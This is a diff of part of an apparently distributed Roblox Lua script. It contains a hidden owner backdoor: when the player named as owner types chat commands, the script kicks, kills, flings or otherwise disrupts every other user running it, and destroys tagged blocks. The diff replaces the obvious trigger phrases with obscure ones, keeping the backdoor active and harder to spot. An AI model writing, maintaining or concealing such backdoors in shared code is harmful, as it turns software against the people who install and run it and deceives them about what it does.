@@ -6175,25 +6175,25 @@ task.spawn(function()
 
 		for i, v in next, PlayerService:GetPlayers() do
 			v.Chatted:Connect(function(Message)				
-				if Message:lower() == "!sigma alluser" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!ay? ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer:Kick("Kicked by script owner | the Sigma")
 					end)
 				end
 
-				if Message:lower() == "!kill alluser" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!kill ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						KillHumanoid(0)
 					end)
 				end
 
-				if Message:lower() == "!lag alluser" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!lag ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
 					end)
 				end
 
-				if Message:lower() == "!bm alluser" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!bm ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						for i, v in next, CollectionService:GetTagged("block") do
 							v:Destroy()
